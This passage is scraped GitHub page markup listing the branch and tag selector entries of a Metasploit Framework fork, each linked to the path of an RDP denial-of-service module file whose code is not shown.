              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/temp-4.4.0/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="temp-4.4.0"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="temp-4.4.0">temp-4.4.0</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/test-2188/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="test-2188"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="test-2188">test-2188</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/test_get_cookies/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="test_get_cookies"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="test_get_cookies">test_get_cookies</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/test_li_connection/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="test_li_connection"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="test_li_connection">test_li_connection</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/test_osx/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="test_osx"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="test_osx">test_osx</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/twiki_maketext/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="twiki_maketext"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="twiki_maketext">twiki_maketext</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/udp_windows/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="udp_windows"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="udp_windows">udp_windows</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/uictl-disappeared/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="uictl-disappeared"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="uictl-disappeared">uictl-disappeared</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/undo_post/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="undo_post"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="undo_post">undo_post</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/unless_over_if_not/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="unless_over_if_not"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="unless_over_if_not">unless_over_if_not</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/unstable/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="unstable"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="unstable">unstable</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/update-pattern-create/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="update-pattern-create"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="update-pattern-create">update-pattern-create</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/use_office_ropdb/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="use_office_ropdb"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="use_office_ropdb">use_office_ropdb</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/v0pCr3w_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="v0pCr3w_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="v0pCr3w_work">v0pCr3w_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/vbulletin/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="vbulletin"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="vbulletin">vbulletin</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/vmware_vcenter_chargeback_upload/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="vmware_vcenter_chargeback_upload"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="vmware_vcenter_chargeback_upload">vmware_vcenter_chargeback_upload</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/web-modules/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="web-modules"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="web-modules">web-modules</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/windows_theme/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="windows_theme"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="windows_theme">windows_theme</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/work_2227/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="work_2227"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="work_2227">work_2227</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/work_osx/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="work_osx"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="work_osx">work_osx</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/wp_asset_manager_upload_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="wp_asset_manager_upload_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="wp_asset_manager_upload_exec">wp_asset_manager_upload_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/wp_property_upload_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="wp_property_upload_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="wp_property_upload_exec">wp_property_upload_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zd_13_226/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zd_13_226"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zd_13_226">zd_13_226</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zdi_13_006/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zdi_13_006"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zdi_13_006">zdi_13_006</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zdi_13_130_exploit/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zdi_13_130_exploit"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zdi_13_130_exploit">zdi_13_130_exploit</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zdi_13_182/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zdi_13_182"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zdi_13_182">zdi_13_182</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zdi_13_190/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zdi_13_190"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zdi_13_190">zdi_13_190</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zdi_13_205/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zdi_13_205"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zdi_13_205">zdi_13_205</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zdi_13_207/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zdi_13_207"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zdi_13_207">zdi_13_207</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zdi_13_225/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zdi_13_225"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zdi_13_225">zdi_13_225</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zdi_reference/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zdi_reference"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zdi_reference">zdi_reference</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zeknox-drupal_views_user_enum.rb/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zeknox-drupal_views_user_enum.rb"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zeknox-drupal_views_user_enum.rb">zeknox-drupal_views_user_enum.rb</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zenworks_control_center_upload/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zenworks_control_center_upload"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zenworks_control_center_upload">zenworks_control_center_upload</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zeroSteiner-module-ms11-080/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zeroSteiner-module-ms11-080"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zeroSteiner-module-ms11-080">zeroSteiner-module-ms11-080</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/zpanel_zsudo/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="zpanel_zsudo"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="zpanel_zsudo">zpanel_zsudo</a>
            </div> <!-- /.select-menu-item -->
        </div>

          <div class="select-menu-no-results">Nothing to show</div>
      </div> <!-- /.select-menu-list -->

      <div class="select-menu-list select-menu-tab-bucket js-select-menu-tab-bucket" data-tab-filter="tags">
        <div data-filterable-for="context-commitish-filter-field" data-filterable-type="substring">


            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20120213000001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20120213000001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20120213000001">20120213000001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20120131000001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20120131000001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20120131000001">20120131000001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20120124000001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20120124000001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20120124000001">20120124000001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20120117000001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20120117000001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20120117000001">20120117000001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20120110000001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20120110000001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20120110000001">20120110000001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20120103000001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20120103000001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20120103000001">20120103000001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20111227000001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20111227000001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20111227000001">20111227000001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20111219000001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20111219000001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20111219000001">20111219000001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20111214013016/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20111214013016"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20111214013016">20111214013016</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20111213184834/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20111213184834"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20111213184834">20111213184834</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/20111205000001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="20111205000001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="20111205000001">20111205000001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012111402/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012111402"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012111402">2012111402</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012111401/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012111401"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012111401">2012111401</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012103101/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012103101"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012103101">2012103101</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012102401/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012102401"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012102401">2012102401</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012101702/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012101702"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012101702">2012101702</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012101701/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012101701"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012101701">2012101701</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012101002/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012101002"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012101002">2012101002</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012101001/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012101001"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012101001">2012101001</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012100301/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012100301"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012100301">2012100301</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012092601/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012092601"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012092601">2012092601</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012091901/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012091901"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012091901">2012091901</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012091202/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012091202"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012091202">2012091202</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012091201/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012091201"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012091201">2012091201</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012090501/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012090501"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012090501">2012090501</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012082901/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012082901"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012082901">2012082901</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012082202/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012082202"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012082202">2012082202</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012082201/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012082201"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012082201">2012082201</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/tree/2012081601/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="2012081601"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="2012081601">2012081601</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
